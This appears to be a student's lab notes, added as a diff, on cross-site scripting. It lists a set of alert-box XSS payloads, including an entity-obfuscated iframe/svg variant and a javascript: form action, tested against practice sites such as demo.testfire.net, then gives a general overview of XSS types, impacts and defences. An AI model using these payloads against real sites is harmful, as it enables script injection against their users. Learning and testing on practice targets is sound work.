@@ -1,0 +1,67 @@
+Xss
+
+other website(https://xss-quiz.int21h.jp/?sid=2a659c7f176f9afb5571f8fe498fd6ff37b99775)
+
+
+Search bar
+1. <script>alert("prasad")</script>
+
+2. <svg/onload=alert('XSS')>
+
+3. hello
+
+4. <br onmouseleave="alert(1)">test</br> 
+let mouse 'leave' the 'text' for alert to generate
+
+5. <x oncopy=alert(1)>copy this!
+copy the text for alert to generate
+
+6. <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+Creates an iframe on screen 
+
+7. <form><input formaction=javascript:alert(1) type=submit value=click>
+click on button for alert to generate
+
+8. <x ondblclick=alert(1)>double click this!
+doubleclick on text for alert to generate
+
+https://demo.testfire.net/feedback.jsp
+
+9. Enter your name, email and comment. Click on Submit
+
+10. Enter <script>alert("prasad")</script> in name, email and comment as it is. Click on Submit.
+
+THEORY:
+Cross-Site Scripting (XSS) is a type of web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal sensitive information, hijack user sessions, deface websites, or redirect users to malicious websites. XSS attacks occur when web applications fail to properly validate, sanitize, or encode user input before displaying it to other users.
+
+Here's an overview of XSS and its implications:
+
+1. **Types of XSS**:
+   - **Reflected XSS**: The malicious script is embedded in a URL or form input, and the user inadvertently executes it by clicking on a specially crafted link or submitting a form.
+   - **Stored XSS**: The malicious script is stored on the server and executed whenever a user visits a page that displays the injected content.
+   - **DOM-based XSS**: The client-side JavaScript code manipulates the Document Object Model (DOM) to execute the malicious script.
+
+2. **Attack Vectors**:
+   - XSS vulnerabilities can occur in various parts of a web application, including input fields, URL parameters, cookies, HTTP headers, and more.
+   - Attackers exploit these vulnerabilities by injecting scripts that execute in the context of the victim's browser.
+
+3. **Impact**:
+   - XSS attacks can have serious consequences, including:
+     - Theft of sensitive information: Attackers can steal cookies, session tokens, or other authentication credentials from users.
+     - Session hijacking: Attackers can impersonate legitimate users and perform actions on their behalf.
+     - Website defacement: Attackers can modify the content of web pages to display defamatory, offensive, or misleading content.
+     - Phishing: Attackers can create convincing phishing pages that mimic legitimate websites to trick users into disclosing their credentials or personal information.
+
+4. **Detection**:
+   - Detecting XSS vulnerabilities can be challenging, as they often require manual code review, automated scanning tools, or penetration testing techniques.
+   - Look for input validation and output encoding mechanisms that may be missing or insufficient.
+
+5. **Prevention**:
+   - To prevent XSS vulnerabilities, web developers should implement proper input validation and output encoding techniques:
+     - Input Validation: Validate and sanitize all user-supplied input to ensure that it conforms to expected formats and does not contain malicious content.
+     - Output Encoding: Encode user-generated content before rendering it in HTML output to prevent it from being interpreted as HTML or JavaScript code.
+
+6. **Mitigation**:
+   - If XSS vulnerabilities are detected, developers should promptly fix them by implementing appropriate security controls, such as input validation, output encoding, or Content Security Policy (CSP) headers.
+
+XSS vulnerabilities are prevalent in web applications and pose significant risks to both users and organizations. It's crucial for web developers to prioritize security and implement robust measures to mitigate the risk of XSS attacks. Additionally, raising awareness about XSS and educating users about safe browsing practices can help minimize the impact of these vulnerabilities.
